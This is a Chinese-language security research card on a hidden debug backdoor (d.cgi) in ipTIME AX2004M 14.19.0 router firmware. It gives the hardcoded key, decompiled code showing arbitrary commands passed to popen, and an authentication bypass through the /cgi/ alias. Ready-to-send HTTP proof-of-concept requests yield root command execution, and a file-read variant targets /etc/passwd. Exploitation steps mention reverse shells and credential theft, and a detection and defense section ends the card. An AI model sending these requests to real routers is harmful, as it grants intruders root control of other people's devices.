---
id: iot-iptime-ax2004m-dcgi-debug-backdoor-command-injection
title: ipTIME AX2004M 隐藏调试后门 d.cgi：硬编码密钥 aaksjdkfj + cmd 参数 popen 命令执行
type: scenario
domain: iot
path: iot
technique: router-cgi-hidden-debug-backdoor-hardcoded-key-popen-rce
aliases:
- ipTIME AX2004M
- AX2004M 14.19.0
- /cgi/d.cgi
- /sess-bin/d.cgi
- /cgibin/d.cgi
- d.cgi
- show_debug_screen
- aaksjdkfj
- '!@dnjsrurelqjrm*&'
- Remote Support
- ftext
tags:
- iot
- router
- firmware
- iptime
- backdoor
- command-injection
- cgi
- popen
- rce
- mips
cve: []
severity: critical
confidence: high
status: verified
affected_versions: AX2004M 14.19.0
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V131
  verified_at: '2026-11-06T05:44:59+08:00'
  notes: 已对照原文与49张图片核对：d.cgi 分发分支、aaksjdkfj 参数逐字符比较（33/64/100/110/106/115/114... 得 !@dnjsrurelqjrm*&）、表单 action=d.cgi、cmd 拼入 2>&1 后 popen 回显、图43/44 ls 输出均一致；原文截图使用带有效会话的 /sess-bin/d.cgi，/cgi/d.cgi 无 Cookie 入口为基于同一别名绕过的推断（卡片已注明）；Remote Support 是否为硬性前置未确认（卡片已标可能）。affected_versions AX2004M 14.19.0 已按原文设置。未复跑 PoC。
---

## 一句话结论

ipTIME AX2004M 14.19.0 的 `cgibin` 中存在一个界面未引用的隐藏调试入口 `d.cgi`：`show_debug_screen()` 要求参数 `aaksjdkfj` 等于硬编码密钥 `!@dnjsrurelqjrm*&`，校验通过后把 `cmd` 参数拼进 `"2>&1 <cmd>"` 交给 `popen()` 执行并回显输出；通过 `/cgi/d.cgi` 别名路径（鉴权绕过）或带有效会话的 `/sess-bin/d.cgi` 即可在设备上以 httpd 权限（root）执行任意命令。

## 原理

- **入口分发**：CGI 分发函数在鉴权判断之后有：

```c
if ( !strcmp(*a2, "/cgibin/d.cgi") )
{
    show_debug_screen(a2);
    return 0;
}
```

  正常 Web 界面不会链接 `d.cgi`，但请求 `/cgi/d.cgi` 会被 Boa 解析为脚本路径 `/cgibin/d.cgi` 并命中该分支；也可以携带有效会话直接访问 `/sess-bin/d.cgi`。

- **硬编码密钥校验**：`show_debug_screen()` 先 `strcpy(v8, "")`，再 `get_value(a1, "aaksjdkfj", v8, 256)`；若提交了该参数，则逐字符比较：`v8[0]==33('!')`、`v8[1]==64('@')`、`v8[2]==100('d')`、`v8[3]==110('n')`、`v8[4]==106('j')`、`v8[5]==115('s')`、`v9==114('r')`…… 完整密钥为 `!@dnjsrurelqjrm*&`。只有密钥匹配才会继续进入命令执行分支。
- **调试表单**：函数生成 `<form method=get action="d.cgi" name="dform">`，包含隐藏字段 `act=1`、`File Name`（`fname`）、`Command Name`（`cmd`）和密钥输入框（`aaksjdkfj`）。密钥输入框的默认值就是遍历得到的 `v8`，即访问时提交的密钥会回显在页面中。
- **命令执行**：

```c
strcpy(v20, "2>&1 ");
result = get_value(a1, "cmd", &v20[5], 251);
if ( result )
{
    printf("<b>command = %s</b><br><br>", &v20[5]);
    v5 = strlen(v20);
    strcpy(&v20[v5], " 2>&1");
    v6 = popen(v20, "r");
    if ( v6 ) { /* fgets 循环把命令输出打印到页面 */ }
}
```

  即执行 `/bin/sh -c "2>&1 <cmd> 2>&1"`，把 stdout/stderr 一并回显。
- **文件读取分支**：伪代码显示 `act=1`、`fdump=on` 且提供 `fname` 时，会 `fopen(fname, "r")` 并用 `fgets`/`printf` 回显文件内容（原文文字提到该行为，未给出该子场景的实测截图）。
- **前置状态**：`show_debug_screen()` 开头调用 `get_remote_support()`，原文操作顺序是先开启 Remote Support 再访问后门；该状态是否为硬性前置，原文未展示完整分支，暂按“可能前置”处理。
- **为什么是后门**：隐藏 handler、二进制内硬编码共享密钥、可直接执行任意命令，三者组合明显不是正常管理功能；密钥可从固件静态提取，不构成安全边界。httpd 以 root 运行，命令执行即设备 root RCE。

## 触发条件

- 目标为 ipTIME AX2004M 14.19.0，Web 管理面可达。
- 通过 `/cgi/d.cgi` 访问（利用 `/cgi/` 别名绕过 `/sess-bin/` 会话校验，无需 Cookie），或持有有效会话访问 `/sess-bin/d.cgi`。
- 提供 `aaksjdkfj=!@dnjsrurelqjrm*&`（URL 编码 `%21%40dnjsrurelqjrm%2A%26`）与 `cmd=<命令>`。
- 可能需要在 Misc Setup 中已开启 Remote Support（原文先开启后利用；代码开头读取该配置）。

## 利用步骤

1. 解包固件（squashfs），在 `cgibin` 中定位 `d.cgi`/`show_debug_screen`，确认密钥比较常量与 `popen` 拼接逻辑（或直接使用已知密钥）。
2. 可选：先经未授权路径开启 Remote Support（`POST /cgi/timerpro.cgi`，`tmenu=iframe&smenu=sysconf_misc&service=remotesupport&run=&...&remotesupporth=1&...`），以满足可能的前置状态。
3. 发送带密钥与命令的请求；页面返回调试表单、`command = <cmd>` 以及命令输出，即命令执行成功。
4. 用 `cmd` 读取配置/凭据、写入文件、启动反弹 shell 或作为内网跳板；注意 busybox 环境命令与路径。

## PoC

```http
GET /cgi/d.cgi?aaksjdkfj=%21%40dnjsrurelqjrm%2A%26&cmd=ls HTTP/1.1
Host: 192.168.0.1
Connection: close
```

```http
POST /cgi/d.cgi HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Connection: close

act=1&fname=&cmd=ls&aaksjdkfj=%21%40dnjsrurelqjrm%2A%26
```

```text
# 原文截图实测（带有效会话走 /sess-bin/d.cgi）：
GET /sess-bin/d.cgi?aaksjdkfj=%21%40dnjsrurelqjrm%2A%26 HTTP/1.1
Cookie: efm_session_id=<valid>
# 页面出现密钥框（预填 !@dnjsrurelqjrm*&）与 Command Name；提交 cmd=ls 后
# 回显 command = ls 及 cgibin 目录文件列表，证明命令执行。
```

## 变体与关联

- 任意文件读取：`act=1&fdump=on&fname=/etc/passwd`（依据伪代码，原文未实测，confidence 较低）。
- 密钥静态提取：从固件二进制中按 `33/64/100/110/106/115/114...` 比较常量还原密钥，或直接在表单回显中读取。
- 未授权入口依赖 `/cgi/` 别名绕过，见 [[iot-iptime-ax2004m-cgi-alias-path-auth-bypass]]。
- 固件解包/仿真方法可参考 [[code-analysis-reverse-firmware-huawei-squashfs-mips-emulation]]、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]；Boa 参数拼接命令注入的同类案例见 [[iot-firmware-boa-pin-command-injection]]。

## 检测与防御

- 检测：任何对 `/cgi/d.cgi` 或 `/sess-bin/d.cgi` 的访问（正常界面不使用该 CGI）；请求含 `aaksjdkfj` 或 `cmd=` 参数；响应页面出现 `Command Name` 表单或 `command = ...` 回显；httpd 进程异常创建子进程。
- 防御：从生产固件移除调试/后门 handler；禁止硬编码密钥；鉴权按处理器统一执行并默认拒绝；httpd 降权运行；升级厂商修复固件。
- 加固：管理面限制内网访问，监控 CGI 异常请求与进程创建。
